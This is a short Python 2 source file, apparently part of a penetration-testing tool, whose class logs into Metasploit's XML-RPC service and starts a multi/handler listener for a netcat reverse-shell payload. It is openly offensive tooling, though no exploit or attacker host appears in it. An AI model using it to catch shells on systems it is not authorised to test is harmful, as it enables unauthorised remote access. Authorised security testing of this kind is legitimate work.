# 
# Copyright (c) 2010 Xavier Garcia  xavi.garcia@gmail.com
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

import xmlrpclib
import socket 
import sys
import time


class MsfXmlRpcListenerErr(Exception):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)



class MsfXmlRpcListener:
	payload="cmd/unix/reverse_netcat"
	lport="8080"
	lhost="127.0.0.1"
	user="msf"
	password=""
	connection=""
	token=""

	def __init__(self):
		pass

	def setPassword(self,passwd):
		self.password=passwd

	def getPassword(self):
		return self.password

	def setUser(self,usr):
		self.user=usr

	def getUser(self):
		return self.user

	def setLhost(self,host):
		self.lhost=host
	
	def getLhost(self):
		return self.lhost

	def setLport(self,port):
		self.lport=port

	def getLport(self):
		return self.lport

	def setPayload(self,payload):
		self.payload=payload

	def getPayload(self):
		return self.payload

	#msf > load xmlrpc Pass=abc123 ServerType=Web	
	def login(self):
		self.connection = xmlrpclib.ServerProxy("http://localhost:55553")
		try:
			ret = self.connection.auth.login(self.user,self.password)
			self.token= ret['token']
			if ret['result']!= 'success': raise MsfXmlRpcListenerErr("Error while connection to msfconsole: login didn't return success")
		except socket.error, err: raise MsfXmlRpcListenerErr('Error while connection to msfconsole: %s' % str(err))
		except xmlrpclib.Fault, err: raise MsfXmlRpcListenerErr('Error while login  to msfconsole: %s' % str(err))

	def launchHandler(self):
		opts = { "LHOST" : self.lhost,"LPORT" : self.lport, "PAYLOAD": self.payload}
		ret = self.connection.module.execute(self.token,"exploit","exploit/multi/handler",opts)
		if ret['result']!='success': raise MsfXmlRpcListenerErr("Unexpected error while creating the listener")
		print "Sleeping before returning the created payload..."
		time.sleep(5)
		

